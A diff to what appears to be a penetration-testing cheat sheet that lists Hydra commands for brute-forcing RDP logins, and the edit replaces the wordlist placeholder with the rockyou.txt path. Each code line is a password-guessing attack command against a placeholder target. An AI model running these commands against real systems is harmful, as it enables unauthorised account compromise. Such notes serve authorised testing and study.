@@ -7,7 +7,7 @@ hydra -l <username> -p <password> rdp://<target-ip>
 
 ## Single username, password list:
 ```bash
-hydra -l <username> -P <wordlist> rdp://<target-ip>
+hydra -l <username> -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
 ```
 
 ## Username list, single password:
@@ -17,7 +17,7 @@ hydra -L <userfile> -p <password> rdp://<target-ip>
 
 ## Username list, password list:
 ```bash
-hydra -L <userfile> -P <wordlist> rdp://<target-ip>
+hydra -L <userfile> -P /usr/share/wordlists/rockyou.txt rdp://<target-ip>
 ```
 
 ## Logging in RDP
